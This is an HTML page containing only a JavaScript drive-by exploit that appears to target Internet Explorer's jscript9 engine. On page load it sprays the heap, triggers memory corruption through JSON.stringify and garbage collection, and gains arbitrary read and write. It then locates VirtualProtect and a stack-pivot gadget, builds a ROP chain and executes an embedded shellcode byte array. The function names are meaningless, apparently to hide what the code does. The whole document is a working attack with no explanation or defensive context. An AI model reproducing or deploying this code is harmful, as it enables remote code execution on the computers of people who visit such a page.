<html>
<head>
<link rel="icon" href="data:,">
</head>
<body>
<script>
var arr = []
 function pepper(){
    var obj1 = [{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
        obj2 : [{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
            obj3 : [{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                obj4 : [{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                    obj5 : [{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                        obj6 : [{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                            obj7 : [{ s1:false
                            }]
                        }]
                    }]
                }]
            }]
        }]
    }];
    var a = JSON.stringify(obj1, function to_s(k, v) {return v;});
    for (var i = 0; i < 8000; i++)
        arr[i] = new ArrayBuffer(12);
    for (i = 0; i < 8000; i++)
    {
        var data = new Uint32Array(arr[i],0);
        data[0] = 0x128ef018;
        data[1] = 0x128ef018;
        data[2] = 0x128ef018;
    }
 CollectGarbage();
 }
stackpivot_gadget = [0x94, 0xc3];
var whmem;
spray = new Array(4096);
buff = new ArrayBuffer(4);
size = 0;
var I = setInterval(function(){
    for (i=0;i<400;i++,size++) {
        spray[size] = new Array(15352);
        for (j = 0; j< 85;j++) {
            spray[size][j] = new Uint32Array(buff);
        }
    }
    if (size >= (4096)) {
        clearInterval(I);
        pepper();
        setInterval(check,100);
    }
}, 100);
function check()
{
    var ia_offset = 0x20;

    for (i=0;i<4096;i++)
    {
        for (j = 0; j< 85;j++) {
            if (spray[i][j].length >= 0x4000000)
            {
                whmem = spray[i][j];

                for (l=0x4000000;l<0x5000000;l+=0x10000)
                {
                    if (whmem[l] == 0x80000002)
                    {
                       for (m=l;m<0x8000+l; m += 1)
                       {
                         if (whmem[m] == 0x00000001)
                         {
                            whmem[m] = 0x7fffffff;
                            whmem[m+1] = 0x10000;
                            break;
                         }
                       }
                       break;
                    } else if (whmem[l] == 0x00000001){
                       whmem[l] = 0x7fffffff;
                       whmem[l+1] = 0x10000;
                       break;
                    } else if (whmem[l+1] == 0x00000001){
                       whmem[l+1] = 0x7fffffff;
                       whmem[l+2] = 0x10000;
                       break;
                    } else if (whmem[l+2] == 0x00000001){
                       whmem[l+2] = 0x7fffffff;
                       whmem[l+3] = 0x10000;
                       break;
                    } else if (whmem[l+3] == 0x00000001){
                       whmem[l+3] = 0x7fffffff;
                       whmem[l+4] = 0x10000;
                       break;
                    }
                }
            }
        }
    }
    for (i=0;i<4096;i++)
    {
        for (j = 0; j< 85;j++) {
            if (spray[i][j].length == 0x7fffffff)
            {
                whmem = spray[i][j];
                whmem[indexOfAddr(0x128e0020)] = 0xDEC0DE * 2 | 1;
                for (current = 0; current < 4096; current++) {
                    if (spray[current][0] == 0xDEC0DE) {
                        break;
                    }
                }
                if (current == 4096) break;
                spray[current][2] = new Array(1);
                spray[current][2][0] = new ArrayBuffer(0xc);
                array_obj_will_be_hijacked = whmem[indexOfAddr(0x128e0028)];
                js9_base = whmem[indexOfAddr(array_obj_will_be_hijacked)] & 0xffff0000;
                vp_addr = swiffer(whmem, js9_base);
                if (vp_addr == 0) break;
                var shellcode = ['106','89','235','8','204','128','76','255','49','110','230','83','89','235','28','9','61','14','82','122','177','193','236','133','122','252','214','54','228','4','83','245','240','205','50','107','174','176','252','155','207','21','224','217','238','235','24','201','167','127','60','206','255','191','217','62','29','108','90','135','203','174','194','95','225','38','37','104','231','63','167','217','116','36','244','235','3','125','191','243','88','235','4','81','78','170','150','129','112','66','118','160','105','250','235','7','109','201','214','153','142','245','214','131','232','252','144','226','234','138','202','130','183','158','89','150','5','137','192','226','150','82','132','226','191','74','43','21','255','14','161','134','113','57','184','226','165','86','161','130','179','253','148','226','251','152','145','169','99','218','36','169','142','113','97','163','247','119','98','130','14','77','244','77','210','3','69','226','165','82','161','130','156','253','172','34','113','41','188','104','17','117','140','226','115','26','132','117','155','181','147','187','158','253','242','89','113','36','172','226','168','98','43','27','210','69','105','216','226','69','95','90','58','218','156','8','134','116','140','73','59','185','173','106','2','148','80','232','5','45','28','35','144','253','226','121','113','100','213','179','201','173','254','1','116','56','174','133','170','137','118','15','169','16','200','90','200','30','215','26','200','41','244','150','42','30','107','132','6','77','240','150','44','41','41','140','156','247','77','97','248','35','202','107','5','166','200','176','243','131','13','62','5','160','243','58','169','37','243','42','169','53','243','150','42','16','200','105','170','16','243','224','27','227','200','205','224','6','103','62','5','160','202','121','171','35','95','185','146','210','13','71','19','33','95','191','169','35','95','185','146','147','233','239','179','33','95','191','170','34','244','60','5','166','51','1','29','15','102','16','173','137','118','60','5','166','198','3','158','16','200','10','151','255','69','3','170','47','137','165','115','145','202','45','115','148','145','169','9','220','94','43','215','136','226','69','105','251','218','81','81','221','11','1','136','136','19','127','5','3','228','150','44','45','247','59','171','39','241','3','251','39','241','60','171','137','112','1','87','175','165','167','169','137','118','3','5','137','151','150','42','253','247','149','121','178','196','150','44','36','95','185','146','8','120','139','137','37','95','191','5','166','171','58','181','66','155','225','112','223','233','154','112','166','127','3','13','88','229','3','84','183','33','190','28','122','254','158','179','131','216','71','102','8','46','16','240','164','204','213','80','83','70','237','203','248','27','157','80','92','228','230','186','182','214','218','249','87','59','233','219','224','22','89','130','21','229','185','124','134','252','231','61','241','13','203','1','90','56','154','170','163','216','210','222','114','217','87','159','38','40','115','94','77','222','45','125','5','2','184','8','147','241','55','149','51','10','105','6','86','24','58','188','130','124','42','75','250','56','5','98','20','232','100','229','115','31','189','198','206','245','66','202','186','233','137','141','101','221','183'];
                spray[current][1] = new Uint8Array(shellcode);
                array_to_hold_shellcode = whmem[indexOfAddr(0x128e0024)];
                shellcode_payload = whmem[indexOfAddr(array_to_hold_shellcode + ia_offset)];
                var sp = westing(whmem, js9_base, stackpivot_gadget);
                if (sp == 0) break;
                arrbuf = new ArrayBuffer(0x500);
                spray[current][0] = new Uint32Array(arrbuf);
                array_to_hold_ropchain = whmem[indexOfAddr(0x128e0020)];
                rop_chain_payload = whmem[indexOfAddr(array_to_hold_ropchain + ia_offset)];
                spray[current][0][0] = vp_addr;
                spray[current][0][1] = shellcode_payload;
                spray[current][0][2] = shellcode_payload;
                spray[current][0][3] = spray[current][1].length;
                spray[current][0][4] = 0x40;
                spray[current][0][5] = rop_chain_payload + ia_offset;
                spray[current][0][36] = js9_base + sp;
                whmem[indexOfAddr(array_obj_will_be_hijacked)] = rop_chain_payload;
                spray[current][2][0] = 0;
            }
        }
    }
}
function boston(a, js9_base, offset) {
    var pe_offset = a[indexOfAddr(js9_base + 0x3c)];
    return a[indexOfAddr(js9_base + pe_offset + offset)];
}
function indexOfAddr(addr) {
    return Math.floor((addr - 0x10000) / 4);
}
function swiffer(a, js9_base) {
    var k32_entry = dragon(a, js9_base);
    var strings_offset = a[indexOfAddr(k32_entry - 0xc)];
    var func_pointers = a[indexOfAddr(k32_entry + 0x4)];
    var func = new String();
    for (func_ptr = js9_base + func_pointers, s = js9_base + strings_offset; func_ptr != 0 && s != 0; func_ptr += 4, s += 4) {
        func = tek(a, js9_base + a[indexOfAddr(s)] +2);
        if (func.indexOf('VirtualProtect') > -1) {
            return a[indexOfAddr(func_ptr)];
        }
    }
    return 0;
}
function dragon(a, js9_base) {
    var import_table_address = js9_base + boston(a, js9_base, 0x80);
    var import_table_size = boston(a, js9_base, 0x84);
    var s = new String();
    for (var i = import_table_address + 0xc; i < js9_base + import_table_address + import_table_size; i += 0x14) {
        var import_table_entry = a[indexOfAddr(i)];
        if (import_table_entry != 0) {
            s = tek(a, js9_base + import_table_entry);
            if (s.indexOf('KERNEL32') > -1 || s.indexOf('kernel32') > -1) {
                return i;
            }
        }
    }
    return 0;
}
function tek(a, addr) {
    var s = new String();
    var i = 0;
    var c = '';
    for (i = addr; c != String.fromCharCode(0); i++) {
        c = String.fromCharCode(cables(a, i));
        s += c;
    }
    return s;
}
function cables(a, addr) {
    var mod = addr%4;
    var ret = a[indexOfAddr(addr)];
    return ((ret>>(mod*8))%0x100);
}
function westing(a, js9_base, gadget) {
    for (zz = 0x1000;zz<0x300000;zz+=4) {
        first_dword = a[indexOfAddr(js9_base + zz)];
        second_dword = a[indexOfAddr(js9_base + zz + 4)];
        gadget_candidate = avacado(first_dword);
        gadget_candidate = gadget_candidate.concat(avacado(second_dword));
        off = gadget_candidate.join('').indexOf(gadget.join(''))
        roff = gadget_candidate.indexOf(gadget[0]);
        if (off != -1) return zz + roff;
    }
    return 0;
}
function avacado(num) {
    var a = [];
    var k = num;
    for (var i = 0; i < 4; i++, k = k >> 8) {
        a.push(k % 0x100);
    }
    return a;
}
</script>
</body>
</html>
